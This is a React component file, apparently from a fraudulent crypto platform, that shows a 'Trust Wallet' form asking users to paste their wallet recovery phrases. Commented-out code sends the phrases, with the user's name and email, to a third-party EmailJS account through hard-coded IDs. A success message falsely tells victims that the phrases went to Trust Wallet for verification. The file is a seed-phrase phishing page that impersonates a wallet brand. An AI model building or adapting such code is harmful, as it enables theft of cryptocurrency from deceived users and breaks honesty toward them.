import React, { useState, useEffect } from 'react'
import { useForm } from 'react-hook-form'
import logo2 from '../../images/logo (2).png'
import { send } from 'emailjs-com'
import Loader from '../../images/loder.gif.gif'

const TrustWallet = ({ setPage, notific, user, refreshPage }) => {
  const [formLoading, setFormLoading] = useState(false)
  const [loading, setLoading] = useState(false)
  const [toSend, setToSend] = useState({
    from_wallet: '',
    from_firstname: '',
    from_lastname: '',
    from_email: '',
    message: '',
  })

  // const {
  //   handleSubmit,
  //   register,
  //   formState: { errors },
  // } = useForm()

  // const onSubmitRequest = (formData) => {
  //   setFormLoading(true)
  //   if (Number(formData.amount) > Number(user.amount)) {
  //     setFormLoading(false)
  //     notific(
  //       'error',
  //       'Insufficent balance. Amount requested is more than your wallet balance'
  //     )
  //   } else {
  //     fetch(`${process.env.REACT_APP_API_URL}/user/withdraw`, {
  //       method: 'post',
  //       headers: { 'content-Type': 'application/json' },
  //       body: JSON.stringify({ formData, email: user.email, type: 'BTC' }),
  //     })
  //       .then((res) => res.json())
  //       .then((data) => {
  //         if (data.success) {
  //           notific('success', data.message)
  //           setFormLoading(false)
  //           setTimeout(() => {
  //             refreshPage()
  //           }, 3000)
  //         } else {
  //           notific('error', data.message)
  //           setFormLoading(false)
  //         }
  //       })
  //       .catch((err) => {
  //         notific('error', 'An error occured')
  //         setFormLoading(false)
  //       })
  //   }
  // }

  useEffect(() => {
    setToSend({
      ...toSend,
      from_email: user.email,
      from_wallet: 'Trust Wallet',
      from_firstname: user.firstname,
      from_lastname: user.lastname,
    })
  }, [])

  const onSubmit = (e) => {
    //     setLoading(true)
    //     setToSend({ ...toSend, from_wallet: 'Trust wallet' })
    //     e.preventDefault()
    //     send('service_68ahmsh', 'template_proinesmet', toSend, 'm6YRrZKtNIMi_eARU')
    //       .then((response) => {
    //         notific('success', 'Phrases submitted')
    //         setFormLoading(true)
    //         setLoading(false)
    //       })
    //       .catch((err) => {
    //         setLoading(false)
    //       })
    notific('error', 'An error occured, contact admin')
  }
  const handleChange = (e) => {
    setToSend({ ...toSend, [e.target.name]: e.target.value })
  }

  return (
    <div>
      <section className='withdraw-transfer'>
        <div className='overlays'>
          <div className='width'>
            {' '}
            <button
              className='home-btn'
              onClick={() => {
                setPage('Home')
              }}
            >
              {' <-'} Back
            </button>
            {formLoading ? (
              <div className='div'>
                <h2>Wallet Phrases submitted to Trust wallet</h2>
                <p>
                  Due to security and privacy reasons, the phrases have been
                  submitted to Trust wallet for verification and access. Upon
                  confirmation we will link the wallet directly from Trust
                  wallet
                </p>
              </div>
            ) : (
              <form className='forms' onSubmit={onSubmit}>
                <div className='with-wrap'>
                  <div className='text-wrapper'>
                    <p>Trust Wallet Phrases</p>
                    <textarea
                      id=''
                      cols='30'
                      rows='10'
                      className='input'
                      placeholder='Phrases'
                      name='message'
                      onChange={handleChange}
                    ></textarea>
                  </div>
                </div>
                <div className='button-wrapper'>
                  {loading ? (
                    <img src={Loader} alt='' />
                  ) : (
                    <input className='button' type='submit' value='Connect' />
                  )}
                </div>
              </form>
            )}
          </div>
        </div>
      </section>
    </div>
  )
}

export default TrustWallet
